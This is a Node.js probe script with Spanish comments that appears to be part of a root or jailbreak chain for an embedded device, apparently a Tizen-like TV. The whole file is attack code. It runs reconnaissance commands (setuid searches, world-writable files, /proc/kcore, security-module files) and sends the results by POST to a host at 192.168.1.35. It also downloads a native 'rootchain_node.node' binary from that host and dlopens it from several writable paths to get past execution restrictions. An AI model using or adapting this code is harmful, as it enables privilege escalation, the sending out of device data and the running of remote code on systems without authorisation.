/**
 * service.js v5 — diagnóstico "fail UEP en dlopen".
 * Objetivo: entender PQ falló el dlopen (noexec? ufd?)
 * y probar dlopen desde otras ubicaciones + exec de binario COPIA firmada
 */
var cp = require('child_process');
var fs = require('fs');
var http = require('http');
var DEST_HOST = '192.168.1.35';
var DEST_PORT = 9999;

function report(obj) {
    var body = JSON.stringify(obj);
    var req = http.request({ host: DEST_HOST, port: DEST_PORT, path: '/probe5', method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) } },
        function (res) { res.resume(); });
    req.on('error', function (e) { });
    req.write(body); req.end();
}

function run(cmds, done) {
    var out = [];
    function next(i) {
        if (i >= cmds.length) { done(out); return; }
        cp.exec(cmds[i], { timeout: 8000 }, function (err, so, se) {
            out.push({ cmd: cmds[i], out: String(so), errout: String(se), err: err ? String(err.message || err) : null });
            next(i + 1);
        });
    }
    next(0);
}

function httpGetBinary(path, cb) {
    http.get({ host: '192.168.1.35', port: 8000, path: path }, function (res) {
        if (res.statusCode !== 200) { cb(new Error('HTTP ' + res.statusCode)); return; }
        var cs = []; res.on('data', function (c) { cs.push(c); });
        res.on('end', function () { cb(null, Buffer.concat(cs)); });
    }).on('error', cb);
}

(function main() {
    var out = { node: process.version };

    runCollect2();
    function runCollect2() {
        var cmds = [
            'id',
            'cat /proc/self/mountinfo | head -25',
            'mount | head -25',
            'ls -la /proc/self/exe',
            'cp /bin/ls /tmp/myls 2>&1; ls -l /tmp/myls; /tmp/myls; echo "exec_copied_bin: rc=$?"',
            'ls -l /usr/bin/*.sh 2>&1 | head -20',
            'cat /usr/bin/appstore.sh 2>&1 | head -40',
            'find /usr/bin /usr/sbin /bin /sbin -perm -4000 -o -perm -2000 2>/dev/null | head -30',
            'find / -perm -o+w -type f 2>/dev/null | grep -v proc | head -30',
            'ls /usr/bin | grep -iE "perl|python|lua|node|mongo|ruby|php|tcl|one|es.exe|go|exec|run" 2>&1 | head -20',
            'ls /usr/lib/node* /usr/local 2>&1 | head',
            'ls -l /opt/usr/home/owner/apps_rw/xvvl3S1bvH/ 2>&1 | head -12',
            'cat /proc/kcore 2>&1 | head -c 64 | od -c | head -4',
            'ls /proc | grep -iE "uep|secu|sece" 2>&1 | head',
            'cat /proc/uep 2>&1; cat /sys/kernel/security/* 2>&1 | head -5'
        ];

        run(cmds, function (out2) {
            out.cmds = out2;

            // dlopen desde otras ubicaciones (moviendo los addons)
            httpGetBinary('/fw-analysis/bin/rootchain_node.node', function (err, buf) {
                if (err) { out.dl = 'ERR ' + err.message; return report(out); }
                out.dl = 'ok ' + buf.length;
                var locs = ['/home/owner/share/rootchain_node.node', '/run/user/5001/rootchain_node.node', '/tmp/rootchain_node.node'];
                var results = [];
                var next = function (i) {
                    if (i >= locs.length) { out.dlopen = results; return report(out); }
                    var path = locs[i];
                    try { fs.writeFileSync(path, buf); fs.chmodSync(path, 0o644); } catch (e) { results.push({ loc: path, w: 'ERR ' + e.message }); return next(i+1); }
                    try { (process).dlopen({}, path); results.push({ loc: path, dlopen: 'ok' }); }
                    catch (e) { results.push({ loc: path, dlopen: 'ERR ' + e.message }); }
                    next(i + 1);
                };
                next(0);
            });
        });
    }
})();
